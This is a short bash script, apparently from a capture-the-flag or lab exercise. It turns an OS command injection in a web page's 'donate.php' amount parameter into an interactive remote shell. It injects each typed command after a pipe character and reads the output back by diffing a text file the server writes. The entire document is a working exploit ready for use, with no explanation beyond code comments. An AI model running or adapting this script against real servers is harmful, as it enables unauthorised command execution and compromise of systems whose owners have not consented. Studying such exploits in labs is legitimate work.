#!/bin/bash

read -rp 'Host: ' host
read -rp 'Port: ' port

while true; do
  read -rp '$ ' raw_command
  command=$(printf %s "${raw_command}" | jq -sRr @uri)

  # Store the previous list of command outputs
  prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")

  # Execute the OS Command Injection vulnerability
  curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"
  
  # Store the new list of command outputs
  new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
  
  # Extract only the difference between the two command outputs
  delta=$(diff --new-line-format="%L" \
               --unchanged-line-format="" \
               <(echo "${prev_resp}") <(echo "${new_resp}"))

  # Output the command result
  echo "${delta}"

done
